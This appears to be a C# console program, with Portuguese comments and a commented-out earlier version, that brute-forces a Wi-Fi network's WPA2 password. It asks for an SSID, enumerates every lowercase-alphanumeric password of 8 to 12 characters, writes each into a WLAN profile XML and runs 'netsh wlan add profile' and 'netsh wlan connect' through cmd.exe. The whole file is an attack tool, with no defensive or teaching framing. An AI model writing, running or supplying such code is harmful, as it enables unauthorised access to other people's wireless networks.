using System;
using System.Diagnostics;
using System.Collections.Generic;
using System.Threading;

class Program
{
    static void Main()
    {
        // Solicitar ao usuário o SSID da rede Wi-Fi:
        Console.Write("Digite o nome da rede Wi-Fi (SSID): ");
        string ssid = Console.ReadLine();

        // Definir os caracteres permitidos para a senha:
        char[] characters = "abcdefghijklmnopqrstuvwxyz0123456789".ToCharArray();

        // Definir os limites do comprimento da senha
        int minPasswordLength = 8; // Comprimento mínimo da senha
        int maxPasswordLength = 12; // Comprimento máximo da senha

        // Loop externo para variar o comprimento da senha
        for (int length = minPasswordLength; length <= maxPasswordLength; length++)
        {
            Console.WriteLine($"\nTestando senhas com {length} dígito(s):");

            // Gerar e testar as combinações de senha com o comprimento atual
            foreach (var password in GenerateCombinations(characters, "", length))
            {
                Console.WriteLine($"Testando senha: {password}");

                // Criar o perfil Wi-Fi com a senha gerada
                CreateWiFiProfile(ssid, password);

                // Conectar-se à rede Wi-Fi
                ConnectToWiFi(ssid);

                // Esperar 10 segundos entre as tentativas
                Thread.Sleep(10000); // Pausa de 10 segundos
            }
        }

        Console.ReadKey();
    }

    static IEnumerable<string> GenerateCombinations(char[] characters, string prefix, int length)
    {
        if (length == 0)
        {
            yield return prefix;
        }
        else
        {
            foreach (char c in characters)
            {
                foreach (var combination in GenerateCombinations(characters, prefix + c, length - 1))
                {
                    yield return combination;
                }
            }
        }
    }

    static void CreateWiFiProfile(string ssid, string password)
    {
        string profileFilePath = "wifi_profile.xml";

        // Criar o arquivo XML com as credenciais
        System.IO.File.WriteAllText(profileFilePath,
            $"<?xml version=\"1.0\"?>\n" +
            $"<WLANProfile xmlns=\"http://www.microsoft.com/networking/WLAN/profile/v1\">\n" +
            $"  <name>{ssid}</name>\n" +
            $"  <SSIDConfig>\n" +
            $"    <SSID>\n" +
            $"      <name>{ssid}</name>\n" +
            $"    </SSID>\n" +
            $"  </SSIDConfig>\n" +
            $"  <connectionType>ESS</connectionType>\n" +
            $"  <connectionMode>auto</connectionMode>\n" +
            $"  <MSM>\n" +
            $"    <security>\n" +
            $"      <authEncryption>\n" +
            $"        <authentication>WPA2PSK</authentication>\n" +
            $"        <encryption>AES</encryption>\n" +
            $"        <useOneX>false</useOneX>\n" +
            $"      </authEncryption>\n" +
            $"      <sharedKey>\n" +
            $"        <keyType>passPhrase</keyType>\n" +
            $"        <protected>false</protected>\n" +
            $"        <keyMaterial>{password}</keyMaterial>\n" +
            $"      </sharedKey>\n" +
            $"    </security>\n" +
            $"  </MSM>\n" +
            $"</WLANProfile>");

        // Executar o comando para adicionar o perfil
        ExecuteCommand($"netsh wlan add profile filename=\"{profileFilePath}\"");
    }

    static void ConnectToWiFi(string ssid)
    {
        // Executar o comando para se conectar à rede
        ExecuteCommand($"netsh wlan connect name=\"{ssid}\"");
    }

    static void ExecuteCommand(string command)
    {
        var process = new Process
        {
            StartInfo = new ProcessStartInfo
            {
                FileName = "cmd.exe",
                Arguments = "/C " + command,
                RedirectStandardOutput = true,
                RedirectStandardError = true,
                UseShellExecute = false,
                CreateNoWindow = true
            }
        };

        process.Start();

        // Ler a saída e a saída de erro
        string output = process.StandardOutput.ReadToEnd();
        string error = process.StandardError.ReadToEnd();
        process.WaitForExit();

        if (process.ExitCode == 0)
        {
            Console.WriteLine($"Comando executado com sucesso: {output}");
        }
        else
        {
            Console.WriteLine($"Erro ao executar o comando: {error}");
        }
    }
}


////
/*
using System;
using System.Diagnostics;
using System.Collections.Generic;
using System.Threading;
using System.Collections.Generic;

class Program
{
    static void Main()
    {
        // Solicitar ao usuário o SSID da rede Wi-Fi:

        Console.Write("Digite o nome da rede Wi-Fi (SSID): ");

        string ssid = Console.ReadLine();

        // Definir os caracteres e o comprimento da senha:

        char[] characters = "abcdefghijklmnopqrstuvwxyz0123456789".ToCharArray();

        int passwordLength = 8; // Defina o comprimento da senha que você quer testar

        // Gerar e testar as combinações de senha
        foreach (var password in GenerateCombinations(characters, "", passwordLength))
        {
            Console.WriteLine($"{password}");

            // Criar o perfil Wi-Fi com a senha gerada
            CreateWiFiProfile(ssid, password);

            // Conectar-se à rede Wi-Fi
            ConnectToWiFi(ssid);

            Thread.Sleep(10000);

        }

        Console.ReadKey();
    }

    static IEnumerable<string> GenerateCombinations(char[] characters, string prefix, int length)
    {
        if (length == 0)
        {
            yield return prefix;
        }
        else
        {
            foreach (char c in characters)
            {
                foreach (var combination in GenerateCombinations(characters, prefix + c, length - 1))
                {
                    yield return combination;
                }
            }
        }
    }

    static void CreateWiFiProfile(string ssid, string password)
    {
        string profileFilePath = "wifi_profile.xml";

        // Criar o arquivo XML com as credenciais
        System.IO.File.WriteAllText(profileFilePath,
            $"<?xml version=\"1.0\"?>\n" +
            $"<WLANProfile xmlns=\"http://www.microsoft.com/networking/WLAN/profile/v1\">\n" +
            $"  <name>{ssid}</name>\n" +
            $"  <SSIDConfig>\n" +
            $"    <SSID>\n" +
            $"      <name>{ssid}</name>\n" +
            $"    </SSID>\n" +
            $"  </SSIDConfig>\n" +
            $"  <connectionType>ESS</connectionType>\n" +
            $"  <connectionMode>auto</connectionMode>\n" +
            $"  <MSM>\n" +
            $"    <security>\n" +
            $"      <authEncryption>\n" +
            $"        <authentication>WPA2PSK</authentication>\n" +
            $"        <encryption>AES</encryption>\n" +
            $"        <useOneX>false</useOneX>\n" +
            $"      </authEncryption>\n" +
            $"      <sharedKey>\n" +
            $"        <keyType>passPhrase</keyType>\n" +
            $"        <protected>false</protected>\n" +
            $"        <keyMaterial>{password}</keyMaterial>\n" +
            $"      </sharedKey>\n" +
            $"    </security>\n" +
            $"  </MSM>\n" +
            $"</WLANProfile>");

        // Executar o comando para adicionar o perfil
        ExecuteCommand($"netsh wlan add profile filename=\"{profileFilePath}\"");
    }

    static void ConnectToWiFi(string ssid)
    {
        // Executar o comando para se conectar à rede
        ExecuteCommand($"netsh wlan connect name=\"{ssid}\"");
    }

    static void ExecuteCommand(string command)
    {
        var process = new Process
        {
            StartInfo = new ProcessStartInfo
            {
                FileName = "cmd.exe",
                Arguments = "/C " + command,
                RedirectStandardOutput = true,
                RedirectStandardError = true,
                UseShellExecute = false,
                CreateNoWindow = true
            }
        };

        process.Start();

        // Ler a saída e a saída de erro
        string output = process.StandardOutput.ReadToEnd();
        string error = process.StandardError.ReadToEnd();
        process.WaitForExit();

        if (process.ExitCode == 0)
        {
            Console.WriteLine($"Comando executado com sucesso: {output}");
        }
        else
        {
            Console.WriteLine($"Erro ao executar o comando: {error}");
        }
    }
}
*/
